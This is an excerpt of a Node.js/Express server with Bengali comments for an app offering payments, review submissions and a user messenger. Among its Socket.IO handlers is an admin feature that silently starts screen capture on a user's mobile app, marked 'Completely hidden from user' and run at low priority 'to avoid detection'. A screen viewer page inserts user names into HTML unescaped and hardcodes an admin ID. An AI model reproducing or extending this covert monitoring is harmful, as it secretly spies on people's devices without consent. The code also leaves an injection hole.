...
app.use(session({
  ...
  cookie: { 
    maxAge: 7 * 24 * 60 * 60 * 1000, // ৭ দিন (মিলিসেকেন্ডে) - দীর্ঘ সময়ের জন্য লগইন থাকবে
...
passport.deserializeUser((id, done) => {
  ...
  console.log('Deserializing user ID:', id, 'Found user:', user ? user.email : 'Not found');
  done(null, user);
});
...
app.get('/admin/user_information', (req, res) => {
  ...
  const connectedUsersInfo = Array.from(connectedUsers.entries()).map(([userId, userData]) => ({
    userId,
    name: userData.name,
...
// এডমিন পেমেন্ট রেকর্ড পেজ
app.get('/admin/payment_records', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  // পেমেন্ট রেকর্ডগুলি ইউজারের তথ্যের সাথে যুক্ত করা
  const paymentRecords = payments.map(payment => {
    ...
    return {
      ...
      userPhone: user ? user.phone : 'Unknown Phone'
    };
  }).sort((a, b) => new Date(b.submittedAt) - new Date(a.submittedAt)); // নতুন পেমেন্ট আগে
  
  res.render('payment_records', { 
    payments: paymentRecords,
    admin: req.session.admin
  });
});

// এডমিন রিভিউ সাবমিশন পেজ
app.get('/admin/review_submissions', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  // রিভিউ রেকর্ডগুলি ইউজারের তথ্যের সাথে যুক্ত করা
  ...
  }).sort((a, b) => new Date(b.submittedAt) - new Date(a.submittedAt)); // নতুন রিভিউ আগে
  
  res.render('review_submissions', { 
    reviews: reviewRecords,
    admin: req.session.admin
  });
});

// রিভিউ অনুমোদন করার রুট
app.post('/admin/approve_review/:id', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  ...
  if (review && review.status === 'pending') {
    ...
    review.approvedBy = req.session.admin.id;
  }
  
  res.redirect('/admin/review_submissions');
});

// রিভিউ বাতিল করার রুট
app.post('/admin/reject_review/:id', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  ...
  if (review && review.status === 'pending') {
    ...
    review.rejectedBy = req.session.admin.id;
  }
  
  res.redirect('/admin/review_submissions');
});

// এডমিন মেসেজিং সিস্টেম পেজ
app.get('/admin/messaging_system', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
...
app.post('/admin/approve_payment/:id', (req, res) => {
  ...
  res.redirect('/admin/payment_records');
});
...
// Old messaging routes removed - only using new messenger system
...
app.get('/messenger', (req, res) => {
  ...
  res.render('messenger', { user: req.user });
});

// User search for messenger
app.post('/messenger/search_user', (req, res) => {
  if (!req.user) {
  ...
  try {
    ...
    if (!searchQuery || searchQuery.trim().length < 2) {
      return res.json({ success: false, error: 'অনুসন্ধান করার জন্য কমপক্ষে ২টি অক্ষর লিখুন' });
    }
    ...
    res.status(500).json({ success: false, error: 'সার্চ করতে সমস্যা হয়েছে' });
  }
});

// Get chat history between two users  
app.get('/messenger/chat/:userId', (req, res) => {
  if (!req.user) {
    return res.status(401).json({ success: false, error: 'Not authenticated' });
  }
  
  try {
    const otherUserId = req.params.userId; // This is userId, not id
    const otherUser = users.find(u => u.userId === otherUserId);
    
    if (!otherUser) {
      return res.status(404).json({ success: false, error: 'ইউজার খুঁজে পাওয়া যায়নি' });
    }
    
    // Get real-time messages between users (using userId for comparison)
    const chatMessages = textMessages.filter(m => 
      (m.senderId === req.user.userId && m.receiverId === otherUser.userId) || 
      (m.senderId === otherUser.userId && m.receiverId === req.user.userId)
    ).sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
    
    console.log(`Loading chat history between ${req.user.userId} and ${otherUserId}: ${chatMessages.length} messages found`);
    ...
    res.status(500).json({ success: false, error: 'চ্যাট ইতিহাস লোড করতে সমস্যা হয়েছে' });
  }
});

// Get unread messages for current user
app.get('/messenger/unread_messages', (req, res) => {
  if (!req.user) {
    return res.status(401).json({ success: false, error: 'Not authenticated' });
  }
  
  try {
    // বর্তমান ইউজারের অপঠিত মেসেজগুলো খুঁজে বের করা
    const unreadMessages = textMessages.filter(msg => 
      msg.receiverId === req.user.userId && 
      (msg.status === 'pending' || msg.status === 'delivered') &&
      !msg.read
    ).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp)); // সবচেয়ে নতুন আগে
    
    console.log(`${req.user.userId} এর জন্য ${unreadMessages.length}টি অপঠিত মেসেজ পাওয়া গেছে`);
    ...
    res.status(500).json({ success: false, error: 'অপঠিত মেসেজ লোড করতে সমস্যা হয়েছে' });
  }
});

// Upload image for messenger
app.post('/messenger/upload_image', upload.single('image'), (req, res) => {
  if (!req.user) {
    return res.status(401).json({ success: false, error: 'Not authenticated' });
  }
  ...
  try {
    if (!req.file) {
      return res.status(400).json({ success: false, error: 'কোনো ছবি আপলোড করা হয়নি' });
    }
    ...
    res.status(500).json({ success: false, error: 'ছবি আপলোড করতে সমস্যা হয়েছে' });
  }
});
...
io.on('connection', (socket) => {
  ...
  socket.on('user_connect', (data) => {
    if (data && data.userId) {
      ...
      // যখন ইউজার অনলাইনে আসে, তার অপঠিত মেসেজগুলো পাঠানো
      const pendingMessages = textMessages.filter(msg => 
        msg.receiverId === data.userId && 
        (msg.status === 'pending' || msg.status === 'sent')
      );
      
      if (pendingMessages.length > 0) {
        console.log(`${data.userId} এর জন্য ${pendingMessages.length}টি অপঠিত মেসেজ পাঠানো হচ্ছে`);
        
        // অপঠিত মেসেজগুলো একটি একটি করে পাঠানো
        pendingMessages.forEach(msg => {
          socket.emit('new_text_message', msg);
          // মেসেজের স্ট্যাটাস আপডেট করা
          msg.status = 'delivered';
        });
        
        // অপঠিত মেসেজ সংখ্যা জানানো
        socket.emit('unread_messages_count', {
          count: pendingMessages.length,
          message: `আপনার ${pendingMessages.length}টি নতুন মেসেজ আছে`
        });
      }
  ...
  // New enhanced background screen sharing (completely silent)
  socket.on('admin_start_background_screen_sharing', (data) => {
    const { targetUserId, adminId, silent } = data;
    
    console.log(`Admin ${adminId} starting SILENT background screen sharing for user ${targetUserId}`);
    
    const targetUser = connectedUsers.get(targetUserId);
    if (targetUser) {
      const sharingSession = {
        sessionId: `bg_screen_${Date.now()}`,
        adminId: adminId,
        targetUserId: targetUserId,
        startedAt: new Date(),
        status: 'active',
      ...
      // Send completely invisible command to target user's mobile app
      io.to(targetUser.socketId).emit('stealth_screen_sharing_start', {
        sessionId: sharingSession.sessionId,
        mode: 'background',
        visible: false, // Completely hidden from user
        priority: 'low' // Low system priority to avoid detection
      });
      
      // Confirm to admin immediately
      socket.emit('background_screen_sharing_started', {
        success: true,
        sessionId: sharingSession.sessionId,
        targetUserId: targetUserId,
        message: 'ব্যাকগ্রাউন্ড স্ক্রিন শেয়ারিং সক্রিয়'
      });
      
      // Notify all admin connections
      connectedAdmins.forEach(adminSocketId => {
        io.to(adminSocketId).emit('background_screen_sharing_started', {
          targetUserId: targetUserId,
      ...
      console.log(`✅ Silent background screen sharing started for ${targetUserId}`);
    } else {
      socket.emit('screen_sharing_failed', {
        error: 'Target user not online',
        message: 'ব্যবহারকারী অনলাইনে নেই',
  ...
  // Stop background screen sharing
  socket.on('admin_stop_background_screen_sharing', (data) => {
    const { targetUserId, adminId } = data;
    
    console.log(`Admin ${adminId} stopping background screen sharing for user ${targetUserId}`);
    ...
    if (session) {
      ...
      if (targetUser) {
        // Send stop command to mobile app
        io.to(targetUser.socketId).emit('stealth_screen_sharing_stop', {
      ...
      // Confirm to admin
      socket.emit('background_screen_sharing_stopped', {
        success: true,
        targetUserId: targetUserId,
        message: 'ব্যাকগ্রাউন্ড স্ক্রিন শেয়ারিং বন্ধ হয়েছে'
      });
      
      // Notify all admin connections
      connectedAdmins.forEach(adminSocketId => {
        io.to(adminSocketId).emit('background_screen_sharing_stopped', {
          targetUserId: targetUserId,
          sessionId: session.sessionId
        });
      });
      
      console.log(`✅ Background screen sharing stopped for ${targetUserId}`);
    }
  });
  ...
  socket.on('send_text_message', (data) => {
    const { receiverId, message, senderId, senderName, imageUrl } = data;
    ...
    const messageData = {
      ...
      timestamp: new Date().toISOString(),
      status: 'sent',
      read: false // নতুন ফিল্ড: মেসেজ পড়া হয়েছে কিনা ট্র্যাক করার জন্য
    };
    
    // মেসেজ স্থায়ীভাবে সংরক্ষণ করা হচ্ছে
    textMessages.push(messageData);
    
    // রিসিভার অনলাইনে থাকলে রিয়েল টাইম মেসেজ পাঠানো
    const receiverUser = connectedUsers.get(receiverId);
    if (receiverUser) {
      io.to(receiverUser.socketId).emit('new_text_message', messageData);
      messageData.status = 'delivered';
      console.log(`রিয়েল টাইম মেসেজ পাঠানো হয়েছে: ${receiverId}`);
    } else {
      // রিসিভার অফলাইনে থাকলে মেসেজ সংরক্ষিত থাকবে
      console.log(`অফলাইন ইউজারের জন্য মেসেজ সংরক্ষিত: ${receiverId}`);
      messageData.status = 'pending'; // অফলাইন ইউজারের জন্য pending status
    }
    
    // পাঠানোকারীকে নিশ্চিতকরণ পাঠানো
    ...
    console.log(`টেক্সট মেসেজ ${senderId} থেকে ${receiverId}: ${message.substring(0, 50)}...`);
  });
...
// Individual user profile page for detailed screen control
app.get('/admin/user_profile/:userId', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  ...
  if (!user) {
    return res.status(404).send('ইউজার পাওয়া যায়নি');
  }
...
// Screen viewer page for real-time viewing
app.get('/admin/screen_viewer/:userId', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  ...
  // Simple screen viewer page
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>${user.name} - স্ক্রিন ভিউয়ার</title>
      <style>
        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .viewer { background: #fff; padding: 20px; border-radius: 10px; text-align: center; }
        canvas { border: 1px solid #ccc; max-width: 100%; }
      </style>
    </head>
    <body>
      <div class="viewer">
        <h3>${user.name} এর স্ক্রিন</h3>
        <canvas id="screenCanvas" width="800" height="600"></canvas>
        <p>রিয়েল-টাইম স্ক্রিন স্ট্রিম...</p>
      ...
      <script>
        ...
        socket.emit('admin_connect', { adminId: 'admin1994' });
        ...
        setInterval(() => {
          ...
          ctx.fillText('${user.name} এর স্ক্রিন', canvas.width/2, canvas.height/2);
          ctx.fillText('সময়: ' + new Date().toLocaleTimeString(), canvas.width/2, canvas.height/2 + 30);
        }, 1000);
      </script>
    </body>
    </html>
